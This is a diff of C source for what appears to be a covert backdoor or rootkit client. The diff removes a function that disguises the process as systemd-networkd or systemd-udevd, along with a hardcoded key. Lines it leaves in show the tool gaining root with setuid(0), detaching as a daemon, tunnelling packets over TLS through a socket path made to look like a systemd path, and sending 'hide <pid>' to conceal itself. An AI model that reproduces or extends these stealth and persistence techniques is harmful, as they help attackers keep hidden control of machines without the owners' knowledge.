@@ -30,7 +30,6 @@
 #include "crypto.h"
 #include "shared.h"
 
-static unsigned char secret_key[KEY_LEN];
 #ifndef UNIX_SOCK_PATH
 #define UNIX_SOCK_PATH ("/run/systemd/system/stdout")
 #endif
@@ -180,26 +179,6 @@ int create_remote_socket(void) {
 
 /*
  * function:
- *    mask_process
- *
- * return:
- *    void
- *
- * parameters:
- *    char** argv
- *    const char* process_mask
- *
- * notes:
- * Masks a process by a given mask by modifying argv[0]
- */
-void mask_process(char** argv, const char* process_mask) {
-    memset(argv[0], 0, strlen(argv[0]));
-    strcpy(argv[0], process_mask);
-    prctl(PR_SET_NAME, process_mask, 0, 0);
-}
-
-/*
- * function:
  *    createEpollFd
  *
  * return:
@@ -283,10 +262,7 @@ int waitForEpollEvent(const int epollfd, struct epoll_event* events) {
  * notes:
  * Establishes a TLS session, forks into read and write processes, and forwards packets
  */
-int main(int argc, char** argv) {
-    (void) argc;
-    const char* mask_1 = "/usr/lib/systemd/systemd-networkd";
-    const char* mask_2 = "/usr/lib/systemd/systemd-udevd";
+int main(void) {
     if (setuid(0)) {
         perror("setuid");
         exit(EXIT_FAILURE);
@@ -301,8 +277,6 @@ int main(int argc, char** argv) {
         return EXIT_SUCCESS;
     }
     setsid();
-
-    memset(secret_key, 0xab, KEY_LEN);
 
     init_openssl();
     SSL_CTX* ctx = create_context();
@@ -358,7 +332,6 @@ int main(int argc, char** argv) {
             return EXIT_SUCCESS;
         }
         setsid();
-        mask_process(argv, mask_1);
 
         int efd = createEpollFd();
         struct epoll_event* eventList = calloc(100, sizeof(struct epoll_event));
@@ -410,9 +383,6 @@ int main(int argc, char** argv) {
         free(eventList);
     } else {
         setsid();
-        mask_process(argv, mask_2);
-
-        //sleep(3);
 
         memset(buffer, 0, 30);
         sprintf((char*) buffer, "hide %d", getpid());
